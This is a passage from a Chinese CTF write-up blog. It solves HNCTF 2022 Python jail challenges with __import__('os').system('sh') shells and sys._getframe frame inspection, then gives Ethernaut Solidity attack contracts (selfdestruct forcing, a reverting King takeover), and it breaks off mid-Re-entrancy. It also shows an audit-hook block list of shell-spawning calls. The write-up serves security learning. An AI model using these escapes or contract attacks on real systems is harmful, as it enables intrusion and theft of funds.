class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _         _          _         _          _         _        </span><br><span class="hljs-string"> | |  ____ | |        | |  ____ | |        | |  ____ | |       </span><br><span class="hljs-string"> | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ </span><br><span class="hljs-string"> | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \</span><br><span class="hljs-string"> | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/</span><br><span class="hljs-string"> |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|</span><br><span class="hljs-string">     \____/               \____/               \____/                                                                                                                                                                                                                                        </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now the program has two functions&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;can you use dockerdoor&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1.func&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2.backdoor&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span>(input_data == <span class="hljs-string">&quot;1&quot;</span>):<br>    func()<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">elif</span>(input_data == <span class="hljs-string">&quot;2&quot;</span>):<br>    backdoor()<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not found the choice&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p>可知func长度限制dao了6，这时我们就可以试试之前用过的help函数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">help</span>()<br><br>Welcome to Python <span class="hljs-number">3.10</span><span class="hljs-string">&#x27;s help utility!</span><br><span class="hljs-string"></span><br><span class="hljs-string">If this is your first time using Python, you should definitely check out</span><br><span class="hljs-string">the tutorial on the internet at https://docs.python.org/3.10/tutorial/.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Enter the name of any module, keyword, or topic to get help on writing</span><br><span class="hljs-string">Python programs and using Python modules.  To quit this help utility and</span><br><span class="hljs-string">return to the interpreter, just type &quot;quit&quot;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">To get a list of available modules, keywords, symbols, or topics, type</span><br><span class="hljs-string">&quot;modules&quot;, &quot;keywords&quot;, &quot;symbols&quot;, or &quot;topics&quot;.  Each module also comes</span><br><span class="hljs-string">with a one-line summary of what it does; to list the modules whose name</span><br><span class="hljs-string">or summary contain a given string such as &quot;spam&quot;, type &quot;modules spam&quot;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">help&gt; __main__</span><br><span class="hljs-string">Help on module __main__:</span><br><span class="hljs-string"></span><br><span class="hljs-string">NAME</span><br><span class="hljs-string">    __main__</span><br><span class="hljs-string"></span><br><span class="hljs-string">DESCRIPTION</span><br><span class="hljs-string">    #it seems have a backdoor as `lake lake lake`</span><br><span class="hljs-string">    #but it seems be limited!</span><br><span class="hljs-string">    #can u find the key of it and use the backdoor</span><br><span class="hljs-string"></span><br><span class="hljs-string">FUNCTIONS</span><br><span class="hljs-string">    backdoor()</span><br><span class="hljs-string"></span><br><span class="hljs-string">    func()</span><br><span class="hljs-string"></span><br><span class="hljs-string">DATA</span><br><span class="hljs-string">    WELCOME = &#x27;</span>\n  _         _          _         _          _  ...       ...<br>    __annotations__ = &#123;&#125;<br>    input_data = <span class="hljs-string">&#x27;1&#x27;</span><br>    key_9d38ee7f31d6126d = <span class="hljs-string">&#x27;95c720690c2c83f0982ffba63ff87338&#x27;</span><br><br>FILE<br>    /home/ctf/server.py<br></code></pre></td></tr></table></figure><p>当我吗输入__ main __ 的时候我们会得到该模块的帮助。</p><p>然后得到key的值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28751</span><br><br>  _         _          _         _          _         _<br> | |  ____ | |        | |  ____ | |        | |  ____ | |<br> | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____<br> | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _  | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/<br> |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|<br>     \____/               \____/               \____/<br><br><br>Now the program has two functions<br>can you use dockerdoor<br><span class="hljs-number">1.</span>func<br><span class="hljs-number">2.</span>backdoor<br>&gt; <span class="hljs-number">2</span><br>Please enter the admin key<br>&gt;95c720690c2c83f0982ffba63ff87338<br>&gt;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sh&#x27;</span>)<br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">__pycache__  flag  server.py</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">flag=NSSCTF&#123;eec5b8a6-ca31-42f5-8d72-99d952240b09&#125;</span><br></code></pre></td></tr></table></figure><h3 id="HNCTF-2022-WEEK2-lak3-lak3-lak3-JAIL"><a href="#HNCTF-2022-WEEK2-lak3-lak3-lak3-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)"></a>[HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#Hi hackers,lak3 comes back</span><br><span class="hljs-comment">#Have a good luck on it! :Wink:</span><br><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br><span class="hljs-keyword">import</span> sys<br>sys.addaudithook<br><br>BLACKED_LIST = [<span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>]<br><br>eval_func = <span class="hljs-built_in">eval</span><br>open_func = <span class="hljs-built_in">open</span><br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> BLACKED_LIST:<br>    <span class="hljs-keyword">del</span> __builtins__.__dict__[m]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_audit_hook</span>(<span class="hljs-params">event, _</span>):<br>    BALCKED_EVENTS = <span class="hljs-built_in">set</span>(&#123;<span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;os.system&#x27;</span>, <span class="hljs-string">&#x27;os.exec&#x27;</span>, <span class="hljs-string">&#x27;os.posix_spawn&#x27;</span>,<span class="hljs-string">&#x27;os.spawn&#x27;</span>,<span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>,<span class="hljs-string">&#x27;code.__new__&#x27;</span>,<span class="hljs-string">&#x27;function.__new__&#x27;</span>,<span class="hljs-string">&#x27;cpython._PySys_ClearAuditHooks&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>&#125;)<br>    <span class="hljs-keyword">if</span> event <span class="hljs-keyword">in</span> BALCKED_EVENTS:<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(event))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guesser</span>():<br>    game_score = <span class="hljs-number">0</span><br>    sys.stdout.write(<span class="hljs-string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)<br>    sys.stdout.flush()<br>    right_guesser_question_answer = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">9999999999999</span>)<br>    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout<br><br>    <span class="hljs-keyword">try</span>:<br>        input_data = eval_func(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&#x27;</span>),&#123;&#125;,&#123;&#125;)<br>    <span class="hljs-keyword">except</span> Exception:<br>        sys.stdout = challenge_original_stdout<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Seems not right! please guess it!&quot;</span>)<br>        <span class="hljs-keyword">return</span> game_score<br>    sys.stdout = challenge_original_stdout<br><br>    <span class="hljs-keyword">if</span> input_data == right_guesser_question_answer:<br>        game_score += <span class="hljs-number">1</span><br>    <br>    <span class="hljs-keyword">return</span> game_score<br><br>WELCOME=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _       _    ____    _       _    ____    _       _    ____  </span><br><span class="hljs-string"> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ </span><br><span class="hljs-string"> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |</span><br><span class="hljs-string"> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt; </span><br><span class="hljs-string"> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |</span><br><span class="hljs-string"> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ </span><br><span class="hljs-string">                                                                                                                                                                       </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(WELCOME)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Welcome to my guesser game!&#x27;</span>)<br>    game_score = guesser()<br>    <span class="hljs-keyword">if</span> game_score == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;you are really super guesser!!!!&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;fake_flag_in_local_but_really_in_The_remote&#125;&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Guess game end!!!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.addaudithook(my_audit_hook)<br>    main()<br><br></code></pre></td></tr></table></figure><p>把函数ban掉了，需要猜对数字才能获取flag</p><p>显而易见正确答案在right_guesser_question_answer里。</p><p>sys._getframe()函数<br>可以调用栈的帧对象，默认参数为0如果传入0那就会获取eval的调用栈帧，所以需要deep一层</p><p>有个小技巧，可以使用__import__(“sys”).<strong>stdout</strong>.write去进行标准输出，这也是上一个非预期的输出方法。</p><p><strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1)))</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28864</span><br><br>  _       _    ____    _       _    ____    _       _    ____<br> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \<br> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |<br> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;<br> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |<br> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/<br><br><br><br>Welcome to my guesser game!<br>Can u guess the number? between <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">9999999999999</span> &gt; <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;sys&quot;</span>).__stdout__.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)._getframe(<span class="hljs-number">1</span>)))<br>&lt;frame at <span class="hljs-number">0x7ff87255d590</span>, file <span class="hljs-string">&#x27;/home/ctf/./server.py&#x27;</span>, line <span class="hljs-number">31</span>, code guesser&gt;Guess game end!!!<br><br></code></pre></td></tr></table></figure><p>发现’&#x2F;home&#x2F;ctf&#x2F;.&#x2F;server.py‘直接调用f_locals查看变量</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28864</span><br><br>  _       _    ____    _       _    ____    _       _    ____<br> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \<br> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |<br> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;<br> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |<br> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/<br><br><br><br>Welcome to my guesser game!<br>Can u guess the number? between <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">9999999999999</span> &gt; <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;sys&quot;</span>).__stdout__.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)._getframe(<span class="hljs-number">1</span>).f_locals))<br>&#123;<span class="hljs-string">&#x27;game_score&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;right_guesser_question_answer&#x27;</span>: <span class="hljs-number">2500207681611</span>, <span class="hljs-string">&#x27;challenge_original_stdout&#x27;</span>: &lt;_io.TextIOWrapper name=<span class="hljs-string">&#x27;&lt;stdout&gt;&#x27;</span> mode=<span class="hljs-string">&#x27;w&#x27;</span> encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>&gt;&#125;Guess game end!!!<br></code></pre></td></tr></table></figure><p>然后构造payload </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)._getframe(<span class="hljs-number">1</span>).f_locals[<span class="hljs-string">&quot;right_guesser_question_answer&quot;</span>]))<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28864</span><br><br>  _       _    ____    _       _    ____    _       _    ____<br> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \<br> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |<br> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;<br> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |<br> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/<br><br><br><br>Welcome to my guesser game!<br>Can u guess the number? between <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">9999999999999</span> &gt; <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)._getframe(<span class="hljs-number">1</span>).f_locals[<span class="hljs-string">&quot;right_guesser_question_answer&quot;</span>]))<br>you are really <span class="hljs-built_in">super</span> guesser!!!!<br>NSSCTF&#123;60ab0629-81f1-42cd-9b23-24fb58531aa5&#125;<br></code></pre></td></tr></table></figure><h3 id="calc-jail-beginner-level6"><a href="#calc-jail-beginner-level6" class="headerlink" title="calc_jail_beginner_level6"></a>calc_jail_beginner_level6</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28599</span><br><br>  _                _                           _       _ _   _                _   __<br> | |              (_)                         (_)     (_) | | |              | | / /<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |</span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/</span><br><span class="hljs-string">              __/ |                          _/ |</span><br><span class="hljs-string">             |___/                          |__/</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Welcome to the python jail</span><br><span class="hljs-string">Let&#x27;</span>s have an beginner jail of calc<br>Enter your expression <span class="hljs-keyword">and</span> I will evaluate it <span class="hljs-keyword">for</span> you.<br>White <span class="hljs-built_in">list</span> of audit hook ===&gt; builtins.<span class="hljs-built_in">input</span>,builtins.<span class="hljs-built_in">input</span>/result,<span class="hljs-built_in">exec</span>,<span class="hljs-built_in">compile</span><br>Some code of python jail:<br><br>  dict_global = <span class="hljs-built_in">dict</span>()<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>      <span class="hljs-keyword">try</span>:<br>          input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>      <span class="hljs-keyword">except</span> EOFError:<br>          <span class="hljs-built_in">print</span>()<br>          <span class="hljs-keyword">break</span><br>      <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bye~~&#x27;</span>)<br>          <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">if</span> input_data == <span class="hljs-string">&#x27;&#x27;</span>:<br>          <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">try</span>:<br>          complie_code = <span class="hljs-built_in">compile</span>(input_data, <span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>, <span class="hljs-string">&#x27;single&#x27;</span>)<br>      <span class="hljs-keyword">except</span> SyntaxError <span class="hljs-keyword">as</span> err:<br>          <span class="hljs-built_in">print</span>(err)<br>          <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">try</span>:<br>          <span class="hljs-built_in">exec</span>(complie_code, dict_global)<br>      <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:<br>          <span class="hljs-built_in">print</span>(err)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut</title>
      <link href="/2023/11/27/Ethernaut/"/>
      <url>/2023/11/27/Ethernaut/</url>
      
        <content type="html"><![CDATA[<h3 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Force &#123;/*<br><br>                   MEOW ?<br>         /\_/\   /<br>    ____/ o o \<br>  /~____  =ø= /<br> (______)__m_m)<br><br>*/&#125;<br><br>contract Hack&#123;<br>  constructor(address payable _owner)payable&#123;<br>    selfdestruct( _owner);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="King"><a href="#King" class="headerlink" title="King"></a>King</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract King &#123;<br><br>  address king;<br>  uint public prize;<br>  address public owner;<br><br>  constructor() payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    payable(king).transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address) &#123;<br>    return king;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求我们成为国王，并且不再改变。</p><h4 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h4><p>然而成为国王需要我们msg.value 超过上个国王的prize，并且msg.sender &#x3D;&#x3D; owner。显然第二个要求成立，但是当我们成为国王后，需要阻止别人超过我们。这时，我们发现receive函数是先转账，然后再修改成为国王的。因此，如果我们拒绝获得转账，那么就可以保持我们是国王了。</p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>我们需要先得到上个国王的prize，只需运行King合约的prize。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract King &#123;<br><br>  address king;<br>  uint public prize;<br>  address public owner;<br><br>  constructor() payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    payable(king).transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address) &#123;<br>    return king;<br>  &#125;<br>&#125;<br>contract Hack&#123;<br>  constructor(address payable target) payable&#123;<br>    uint prize= King(target).prize();<br>    (bool ok,)=target.call&#123;value: prize&#125;(&quot;&quot;);<br>    require(ok,&#x27;call.failed&#x27;);<br>  &#125;<br>  //fallback() external payable&#123;<br>  //revert();<br>  //&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">fallback() external payable&#123;<br>revert();<br>  &#125;<br></code></pre></td></tr></table></figure><p>该函数也就相当于什么的没有，即拒绝转账。</p><h3 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a><strong>Re-entrancy</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.12;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Reentrance &#123;<br>  